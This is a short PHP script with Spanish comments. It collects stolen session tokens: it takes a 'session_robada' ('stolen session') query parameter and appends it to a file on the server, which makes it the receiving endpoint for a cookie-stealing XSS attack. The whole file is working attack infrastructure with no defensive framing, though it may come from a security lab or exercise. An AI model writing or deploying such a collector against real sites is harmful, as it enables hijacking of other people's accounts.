<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);

$session_robada = $_GET['session_robada'] ?? "";
$session_robada .= "\n";
$fichero = '/data/sessions.txt';
// Abre el fichero para obtener el contenido existente
$actual = file_get_contents($fichero);
// Escribe el contenido al fichero
file_put_contents($fichero, $session_robada, FILE_APPEND);
?>